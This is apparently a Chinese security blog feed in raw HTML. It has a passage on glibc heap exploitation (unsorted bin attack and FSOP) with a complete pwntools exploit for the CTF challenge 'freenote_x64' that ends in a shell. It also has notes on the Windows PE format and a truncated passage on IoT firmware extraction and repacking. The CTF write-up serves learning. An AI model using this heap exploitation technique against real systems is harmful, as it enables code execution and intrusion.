class="hljs-string">&quot;我们释放第一个 chunk，它将被插入到 unsorted bin 中，且其 bk 指针指向 %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//------------漏洞模拟-----------</span><br><br>p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在模拟一个漏洞，覆盖 victim-&gt;bk 指针\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;并将其写为目标地址减去 16 (在32位机器上应为目标地址减去8): %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//------------------------------------</span><br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再次 malloc 来获取刚释放的 chunk。此时目标地址应已经被重写：\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>测试结果如下，目标地址的值成功被main_arena相关地址覆盖</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250725173932738.png" alt="image-20250725173925604"></p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p><p>前面unsorted bin attack可将<code>_IO_list_all</code>指针的值修改为<code>main_arena+88</code>。但这还不够，因为我们很难控制main_arena中的数据，并不能在mode、<code>_IO_write_ptr</code>和<code>_IO_write_base</code>的对应偏移处构造出合适的值。</p><p>所以将目光转向<code>_IO_FILE</code>的链表特性。<code>_IO_flush_all_lockp</code>函数会通过<code>fp = fp-&gt;_chain</code>不断的寻找下一个<code>_IO_FILE</code>。</p><p>巧妙的是，<code>_IO_FILE</code>结构中的<code>_chain</code>字段对应偏移是0x68，而在<code>main_arena+88</code>对应偏移为0x68的地址正好是大小为0x60的small bin的bk，所有我们可以利用其他漏洞修改unsorted bin的size位0x61，所以在将其链入small bin[0x60]之后，就可以实现如下图所示的攻击链。</p><p>因为 vtable 中的函数调用时会把对应的 <code>_IO_FILE_plus</code> 指针作为第一个参数传递，因此这里我们把 “sh” 写入 <code>_IO_FILE_plus</code> 头部。</p><p><img src="https://bbs.kanxue.com/upload/attach/202210/830671_HU9RPYGJFHCFAAZ.png" alt="830671_HU9RPYGJFHCFAAZ.png (1200×551)"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://files.buuoj.cn/files/7d509440caec7aafd875327047d42566/freenote_x64">附件</a></p><h3 id="题目关键点分析"><a href="#题目关键点分析" class="headerlink" title="题目关键点分析"></a>题目关键点分析</h3><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250725174440233.png" alt="image-20250725174440143"></p><p>题目中的malloc相关操作，都会向0x80对齐，无法利用fast bin。</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250725174551933.png" alt="image-20250725174551850"></p><p>仅仅存在UAF漏洞</p><p>利用思路：</p><ol><li>利用UAF去泄露堆地址和栈地址</li><li>利用edit中的realloc修改unsorted bin的size为0x61bk指针为IO_list_all - 0x10，并布置伪造的IO结构体</li><li>利用unsorted bin attack修改IO_list_all为main_arean+88</li></ol><p>对于2.23的FSOP</p><p>修改<code>unsorted bin</code>的<code>size</code>为<code>0x61</code>， 然后从<code>unsorted bin chunk</code>的头部开始，布局如下：<code>[/bin/sh\x00, 0x61 0, _IO_list_all - 0x10, 0, 1, 0xa8 * &quot;\x00&quot;, fake_vtable_addr]</code>，然后<code>fake_vtable</code>填的内容如下：<code>[0, 0, 0, system_addr]</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Basic PWN Template - Basic Template</span><br><span class="hljs-string">Author: p0ach1l</span><br><span class="hljs-string">Date: 2025-07-24</span><br><span class="hljs-string">Target: no description</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnscript <span class="hljs-keyword">import</span> *<br><br><br>filename = <span class="hljs-string">&quot;./freenote_x64&quot;</span><br>url = <span class="hljs-string">&#x27;node5.buuoj.cn:28856&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  # b * 0x0000000000400CA5</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=<span class="hljs-string">&#x27;&#x27;</span>)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;/usr/lib/freelibs/amd64/2.23-0ubuntu11_amd64/libc.so.6&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">== 0ops Free Note ==</span><br><span class="hljs-string">1. List Note</span><br><span class="hljs-string">2. New Note</span><br><span class="hljs-string">3. Edit Note</span><br><span class="hljs-string">4. Delete Note</span><br><span class="hljs-string">5. Exit</span><br><span class="hljs-string">====================</span><br><span class="hljs-string">Your choice:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>() :<br>  choice(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  choice(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;Length of new note: &quot;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&quot;Enter your note: &quot;</span> , content.ljust(size , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , new_size , content</span>) :<br>  choice(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;Note number: &quot;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&quot;Length of note: &quot;</span> , <span class="hljs-built_in">str</span>(new_size))<br>  p.sendlineafter(<span class="hljs-string">&quot;Enter your note: &quot;</span> , content.ljust(new_size , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  choice(<span class="hljs-number">4</span>)<br>  p.sendlineafter(<span class="hljs-string">&quot;Note number: &quot;</span> , <span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x200</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x200</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x200</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br><br>show()<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0. &#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span> , drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">0x8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>add(<span class="hljs-number">0x200</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>show()<br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">0x8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>libc.address = libc_base<br>IO_list_all = libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = flat([<br>  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span>,<br>  <span class="hljs-number">0</span>,<br>  <span class="hljs-number">0x211</span><br>])<br><br>edit(<span class="hljs-number">1</span> , <span class="hljs-number">0x280</span> , payload)<br>free(<span class="hljs-number">0</span>)<br><br>payload = flat([<br>  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span>,<br>  <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>,  <span class="hljs-comment">##结构体的首个</span><br>  <span class="hljs-number">0x61</span>,<br>  <span class="hljs-number">0</span>,<br>  IO_list_all - <span class="hljs-number">0x10</span>,<br>  <span class="hljs-number">0</span>,<br>  <span class="hljs-number">1</span>,<br>  <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xa8</span>,    <span class="hljs-comment">##只能是\x00</span><br>  heap_addr + <span class="hljs-number">0x380</span>,<br>  [<span class="hljs-number">0</span>] * <span class="hljs-number">2</span>,<br>  [system_addr] * <span class="hljs-number">2</span><br>])<br><br>edit(<span class="hljs-number">1</span> , <span class="hljs-number">0x280</span> , payload)<br><br>choice(<span class="hljs-number">2</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Length of new note: &quot;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0x300</span>))<br><br>lss(<span class="hljs-string">&quot;IO_list_all&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_addr&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>windows PE(一)</title>
    <link href="/2025/07/22/windows-PE-%E4%B8%80/"/>
    <url>/2025/07/22/windows-PE-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="windows-PE-一"><a href="#windows-PE-一" class="headerlink" title="windows PE(一)"></a>windows PE(一)</h1><h2 id="PE指纹"><a href="#PE指纹" class="headerlink" title="PE指纹"></a>PE指纹</h2><p>判断是否是PE的标志，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250723105232418.png" alt="image-20250723105232354"></p><h2 id="DOS部分"><a href="#DOS部分" class="headerlink" title="DOS部分"></a>DOS部分</h2><p>用VS studio生成一个PE文件用010打开，标出的部分就是DOS部分</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250722210954343.png" alt="image-20250722210947234"></p><p>可以通过VS studio来看一下结构体的构成，大小为64个字节，其中最关键的有两个，第一个<strong>e_magic</strong>，这是dos部分的魔数为MZ，第二个e_lfanew，用来寻找PE文件头，其余部分<strong>修改均不影响正常运行</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="hljs-comment">// DOS .EXE header</span><br>    WORD   e_magic;                     <span class="hljs-comment">// Magic number</span><br>    WORD   e_cblp;                      <span class="hljs-comment">// Bytes on last page of file</span><br>    WORD   e_cp;                        <span class="hljs-comment">// Pages in file</span><br>    WORD   e_crlc;                      <span class="hljs-comment">// Relocations</span><br>    WORD   e_cparhdr;                   <span class="hljs-comment">// Size of header in paragraphs</span><br>    WORD   e_minalloc;                  <span class="hljs-comment">// Minimum extra paragraphs needed</span><br>    WORD   e_maxalloc;                  <span class="hljs-comment">// Maximum extra paragraphs needed</span><br>    WORD   e_ss;                        <span class="hljs-comment">// Initial (relative) SS value</span><br>    WORD   e_sp;                        <span class="hljs-comment">// Initial SP value</span><br>    WORD   e_csum;                      <span class="hljs-comment">// Checksum</span><br>    WORD   e_ip;                        <span class="hljs-comment">// Initial IP value</span><br>    WORD   e_cs;                        <span class="hljs-comment">// Initial (relative) CS value</span><br>    WORD   e_lfarlc;                    <span class="hljs-comment">// File address of relocation table</span><br>    WORD   e_ovno;                      <span class="hljs-comment">// Overlay number</span><br>    WORD   e_res[<span class="hljs-number">4</span>];                    <span class="hljs-comment">// Reserved words</span><br>    WORD   e_oemid;                     <span class="hljs-comment">// OEM identifier (for e_oeminfo)</span><br>    WORD   e_oeminfo;                   <span class="hljs-comment">// OEM information; e_oemid specific</span><br>    WORD   e_res2[<span class="hljs-number">10</span>];                  <span class="hljs-comment">// Reserved words</span><br>    LONG   e_lfanew;                    <span class="hljs-comment">// File address of new exe header</span><br>  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;<br></code></pre></td></tr></table></figure><h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><p>PE文件头的结构体定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_NT_HEADERS</span> &#123;</span><br>    DWORD Signature;   <span class="hljs-comment">//PE头标志 4字节 </span><br>    IMAGE_FILE_HEADER FileHeader; <span class="hljs-comment">//标准PE头 20个字节</span><br>    IMAGE_OPTIONAL_HEADER32 OptionalHeader;  <span class="hljs-comment">//扩展PE头 32位下224字节(0xE0) 64位下240字节(0xF0)</span><br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br></code></pre></td></tr></table></figure><p>其中标准PE头结构体定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span> &#123;</span><br>    WORD    Machine;     <span class="hljs-comment">//运行平台标准码，0代表任意平台，i386：14c, x64:8664 （不可改）</span><br>    WORD    NumberOfSections;  <span class="hljs-comment">//节的数量 （不可改）</span><br>    DWORD   TimeDateStamp;   <span class="hljs-comment">//时间戳 （可改）</span><br>    DWORD   PointerToSymbolTable;   <span class="hljs-comment">//调试相关 （可改）</span><br>    DWORD   NumberOfSymbols;   <span class="hljs-comment">//调试相关 （可改）</span><br>    WORD    SizeOfOptionalHeader;   <span class="hljs-comment">//扩展PE头的大小。32位0xE0，64位0xF0 （不可改）</span><br>    WORD    Characteristics;   <span class="hljs-comment">//文件属性 （不可改）</span><br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br></code></pre></td></tr></table></figure><p>关于文件属性含义如下：</p><table><thead><tr><th><code>0x0002</code></th><th>可执行文件（Executable）</th></tr></thead><tbody><tr><td><code>0x2000</code></td><td>DLL 文件</td></tr><tr><td><code>0x0004</code></td><td>没有 COFF 符号表</td></tr><tr><td><code>0x0100</code></td><td>32位机器（适用于 x86）</td></tr><tr><td><code>0x0020</code></td><td>可重定位代码</td></tr></tbody></table><p>多个标志可以按位或组合（<code>|</code>）。</p><p>扩展头结构定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Standard fields.</span><br>    <span class="hljs-comment">//</span><br><br>    WORD    Magic;<span class="hljs-comment">//PE32: 10B PE64: 20B</span><br>    BYTE    MajorLinkerVersion;           <span class="hljs-comment">//链接器的大版本 没用(可改)</span><br>    BYTE    MinorLinkerVersion; <span class="hljs-comment">//链接器的小版本 没用(可改)</span><br>    DWORD   SizeOfCode;<span class="hljs-comment">//所有含有代码的区块的大小 编译器填入 没用(可改)</span><br>    DWORD   SizeOfInitializedData;<span class="hljs-comment">//所有初始化数据区块的大小 编译器填入 没用(可改)</span><br>    DWORD   SizeOfUninitializedData;<span class="hljs-comment">//所有含未初始化数据区块的大小 编译器填入 没用(可改)</span><br>    DWORD   AddressOfEntryPoint;<span class="hljs-comment">//程序入口RVA</span><br>    DWORD   BaseOfCode;<span class="hljs-comment">//代码区块起始RVA</span><br>    DWORD   BaseOfData;<span class="hljs-comment">//数据区块起始RVA</span><br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// NT additional fields.</span><br>    <span class="hljs-comment">//</span><br><br>    DWORD   ImageBase;    <span class="hljs-comment">//内存镜像基址(程序默认载入基地址)</span><br>    DWORD   SectionAlignment; <span class="hljs-comment">//内存中对齐大小</span><br>    DWORD   FileAlignment; <span class="hljs-comment">//文件中对齐大小(提高程序运行效率)</span><br>    WORD    MajorOperatingSystemVersion;<br>    WORD    MinorOperatingSystemVersion;<br>    WORD    MajorImageVersion;<br>    WORD    MinorImageVersion;<br>    WORD    MajorSubsystemVersion;<br>    WORD    MinorSubsystemVersion;<br>    DWORD   Win32VersionValue;<br>    DWORD   SizeOfImage;<span class="hljs-comment">//内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍</span><br>    DWORD   SizeOfHeaders; <span class="hljs-comment">//所有的头加上节表文件对齐之后的值</span><br>    DWORD   CheckSum;<span class="hljs-comment">//映像校验和,一些系统.dll文件有要求,判断是否被修改</span><br>    WORD    Subsystem;<br>    WORD    DllCharacteristics;<span class="hljs-comment">//文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性</span><br>    DWORD   SizeOfStackReserve;<br>    DWORD   SizeOfStackCommit;<br>    DWORD   SizeOfHeapReserve;<br>    DWORD   SizeOfHeapCommit;<br>    DWORD   LoaderFlags;<br>    DWORD   NumberOfRvaAndSizes;<br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="hljs-comment">//数据目录表,结构体数组</span><br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br></code></pre></td></tr></table></figure><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>节表的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>            DWORD   PhysicalAddress;<br>            DWORD   VirtualSize;    <span class="hljs-comment">//节表内存中未对齐的大小</span><br>    &#125; Misc;<br>    DWORD   VirtualAddress;         <span class="hljs-comment">//节表在内存中偏移</span><br>    DWORD   SizeOfRawData;          <span class="hljs-comment">//节表在文件中的对齐大小</span><br>    DWORD   PointerToRawData;       <span class="hljs-comment">//节表在文件中偏移</span><br>    DWORD   PointerToRelocations;<br>    DWORD   PointerToLinenumbers;<br>    WORD    NumberOfRelocations;<br>    WORD    NumberOfLinenumbers;<br>    DWORD   Characteristics;<span class="hljs-comment">//节的属性</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br></code></pre></td></tr></table></figure><p>了解了节表的结构体之后就能进行FA和RVA地址的相互转换</p><h3 id="RVA-↔-FA-转换公式"><a href="#RVA-↔-FA-转换公式" class="headerlink" title="RVA ↔ FA 转换公式"></a>RVA ↔ FA 转换公式</h3><p>要在<strong>RVA 和 FA 之间转换</strong>，你需要节表（Section Table）中的信息，转换中心思想是找到地址在<strong>节中的偏移</strong> ：</p><ol><li><p>找到 RVA 所在的节：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">RVA &gt;= Section.VirtualAddress &amp;&amp; RVA &lt;  Section.VirtualAddress + Section.VirtualSize<br></code></pre></td></tr></table></figure></li><li><p>转换公式如下：</p></li></ol><ul><li><p><strong>RVA → FA</strong>：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">FA = (RVA - <span class="hljs-keyword">Section</span>.VirtualAddress) + <span class="hljs-keyword">Section</span>.PointerToRawData<br></code></pre></td></tr></table></figure></li><li><p><strong>FA → RVA</strong>：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">RVA = (FA - <span class="hljs-keyword">Section</span>.PointerToRawData) + <span class="hljs-keyword">Section</span>.VirtualAddress<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/06/21/IOT%E5%AE%89%E5%85%A8%E7%A1%AC%E4%BB%B6%E7%9F%A5%E8%AF%86/"/>
    <url>/2025/06/21/IOT%E5%AE%89%E5%85%A8%E7%A1%AC%E4%BB%B6%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="IOT安全硬件知识"><a href="#IOT安全硬件知识" class="headerlink" title="IOT安全硬件知识"></a>IOT安全硬件知识</h1><h2 id="uart-接口"><a href="#uart-接口" class="headerlink" title="uart 接口"></a>uart 接口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsusb   //查看芯片<br>dmesg | grep -i <span class="hljs-built_in">tty</span>  //查看串口节点是否创建<br></code></pre></td></tr></table></figure><h2 id="提取文件系统"><a href="#提取文件系统" class="headerlink" title="提取文件系统"></a>提取文件系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=./&lt;firmname&gt;.BIN bs=1 skip=&lt;start&gt; count=&lt;size&gt; of=squashfs.img<br></code></pre></td></tr></table></figure><h2 id="解包文件系统"><a href="#解包文件系统" class="headerlink" title="解包文件系统"></a>解包文件系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unsquashfs squashfs.img<br></code></pre></td></tr></table></figure><p>重新打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mksquashfs squashfs-root/ new_squashfs.img -comp xz -noappend<br></code></pre></td></tr></table></figure><p>写入固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=new_squashfs.img of=new_firm.BIN bs=1 seek=3014656 conv=notrunc<br></code></pre></td></tr></table></figure><p>命令积累</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./bin/busybox.armel netstat -anlp<br></code></pre></td></tr></table></figure><h2 id="传入iot设备文件"><a href="#传入iot设备文件" class="headerlink" title="传入iot设备文件"></a>传入iot设备文件</h2><ol><li><p>nc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 